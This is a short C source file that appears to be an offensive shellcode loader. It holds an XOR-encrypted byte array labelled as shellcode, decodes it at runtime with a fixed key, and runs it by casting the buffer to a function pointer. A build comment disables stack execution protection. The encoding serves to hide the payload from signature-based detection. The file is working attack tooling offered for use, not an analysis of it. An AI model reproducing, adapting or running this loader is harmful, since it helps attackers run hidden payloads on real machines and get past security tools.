#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// gcc -o loader loader.c -z execstack

//Shellcode
// Paste in the encrypted xor shellcode
unsigned char buf[] = "\x02\x7B\x83\x02\xCB\xA3\xBC\xB5\xB5\xB5\x02\xC7\x4F\xA5\xB5\xB5\xB5\x02\xF1\xFD\x9A\xFF\xF2\xBE\xDA\x73\x79\x02\x7B\x12\x6D\x02\x67\xB2\xB5\xB5\xB5\xA8\xBE\x97\xB3\xA7\x6B\xD4\xD8\x2C\x13\xFC\xC4\xF0\xF7\xF6\x4D\x3B\xC0\xFF\x9A\xFE\x49\xB4\xD0\x73\xF9\xAC\xD2\x76\x14\xD4\xCA\x29\x13\xD7\xC2\xF0\xF7\xD4\xD9\x2D\x31\x02\x54\x95\xD3\xE6\xD5\x76\x0C\x0B\xF0\xC4\xAA\x27\x92\xC8\x56\x9F\xF3\x91\xDD\xCD\xB2\x73\x2A\xB5\x13\x18\xA0\xE9\x92\xFA\x9F\xF2\x9F\xFF\xF2\xBE\xDA\x73\x79\x4A";

int main(int argc, char **argv) 
{
        //Arbitrary value 
        char xor_key = 'J';
        int arraysize = (int) sizeof(buf);
        for (int i=0; i < arraysize - 1; i++)
        {
                buf[i] = buf[i] ^ xor_key;
        }
        // Run the shellcode
        int (*ret)() = (int(*)())buf;
        ret();
}
